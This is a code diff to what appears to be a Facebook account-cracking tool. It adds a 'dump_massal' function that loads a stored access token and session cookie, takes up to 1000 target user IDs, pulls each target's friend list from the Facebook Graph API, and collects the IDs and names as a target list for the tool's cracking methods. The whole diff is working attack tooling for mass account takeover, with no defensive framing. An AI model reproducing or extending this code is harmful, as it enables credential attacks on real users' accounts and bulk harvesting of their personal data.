@@ -338,6 +338,7 @@ def menu():
     os.system('clear')
     print(logo)
     print('\x1b[0;95m[ 1 ] CRACK FILE')
+    print('\x1b[38;5;231m[ 2 ] CRACK FILE')
     #print("""\033[1;93m[0] EXIT """)
     BALEN = input('\x1b[0;90mSELET :  ')
     if BALEN in ['111']:
@@ -371,11 +372,66 @@ def crack_file():
     setting()
  
 #-------------[ PENGATURAN-IDZ ]---------------#
+def dump_massal():    
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+	    exit()
+	try:
+		kumpulkan = int(input(f'\n\x1b[30m CHAN ID : '))
+	except ValueError:
+	    exit()
+	if kumpulkan<1 or kumpulkan>1000:
+	    exit()
+	ses=requests.Session()
+	bilangan = 0
+	for KOTG49H in range(kumpulkan):
+		bilangan+=1
+		Masukan = input(f'\n\x1b[34m [•] Enter ID  '+str(bilangan)+f' : ')
+		uid.append(Masukan)
+	for user in uid:
+	    try:
+	       head = (
+	       {'user-agent': 'Mozilla/5.0 (Android; Android 4.4.1; Nokia 3410 Build/IMM76D) AppleWebKit/600.20 (KHTML, like Gecko)  Chrome/49.0.3035.398 Mobile Safari/601.5'
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+	      print(" Total  : "+str(len(id))) 
+	      setting()
+	except requests.exceptions.ConnectionError:
+	    exit()
+	except (KeyError,IOError):
+		exit()
  
 def setting():
     print(f'''{b}
-  [1] \x1b[38;5;46mFAECBOOK  OLD🙂🖤
-  [2]  \x1b[38;5;46mFACEBOOK RANDOM🌪️
+  
+  [2]  \033[32mFACEBOOK RANDOM🌪️
 ''')
     hu = input('\nHalbzhera : ')
     if hu in ['1','01']:
@@ -398,7 +454,7 @@ def setting():
         for bacot in id:
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
-    print('\x1b[1;96m[ 1 ] m.facebook.com')
+    print('\x1b[1;96m[ 1 ] METHOD x zero')
     hc = input('\nHalbzhera : ')
     if hc in ['1','01']:
         method.append('mobile')
